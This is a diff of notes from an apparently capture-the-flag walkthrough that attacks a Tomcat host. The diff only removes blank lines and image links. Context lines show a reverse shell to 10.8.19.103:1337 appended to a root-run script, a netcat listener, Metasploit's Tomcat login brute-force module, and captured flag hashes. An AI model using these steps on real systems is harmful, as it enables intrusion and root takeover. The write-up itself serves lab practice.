@@ -224,7 +224,6 @@ uid=0(root) gid=0(root) groups=0(root)
 tomcat@ubuntu:/home/jack$ echo "/bin/bash -i >& /dev/tcp/10.8.19.103/1337 0>&1" >> id.sh
 >> id.shin/bash -i >& /dev/tcp/10.8.19.103/1337 0>&1" 
 
-
 ┌──(root㉿kali)-[/home/kali]
 └─# rlwrap nc -lvnp 1337
 Ncat: Version 7.93 ( https://nmap.org/ncat )
@@ -245,7 +244,6 @@ d89d5391984c0450a95497153ae7ca3a
 
 --another way using metasploit
 
-
 ┌──(kali㉿kali)-[~]
 └─$ msfconsole -q
 msf6 > search tomcat_mgr_login
@@ -256,7 +254,6 @@ Matching Modules
    #  Name                                     Disclosure Date  Rank    Check  Description
    -  ----                                     ---------------  ----    -----  -----------
    0  auxiliary/scanner/http/tomcat_mgr_login                   normal  No     Tomcat Application Manager Login Utility
-
 
 Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/tomcat_mgr_login                                                                                                           
 
@@ -301,7 +298,6 @@ Module options (auxiliary/scanner/http/tomcat_mgr_login):
                      mgr_default_users.txt
    VERBOSE           true                         yes       Whether to print output for all attempts
    VHOST                                          no        HTTP server virtual host
-
 
 View the full module info with the info, or info -d command.
 
@@ -493,17 +489,9 @@ Loading extension priv...
 [-]   - windows/x64/meterpreter*
 [-]   - windows/meterpreter*
 
-
 It works :)
 
-
 ```
-
-![[Pasted image 20221227180756.png]]
-
-![[Pasted image 20221227182513.png]]
-
-![[Pasted image 20221227182639.png]]
 
 user.txt  
 
@@ -512,6 +500,5 @@ user.txt
 root.txt
 
 *d89d5391984c0450a95497153ae7ca3a*
-
 
 [[The Cod Caper]]
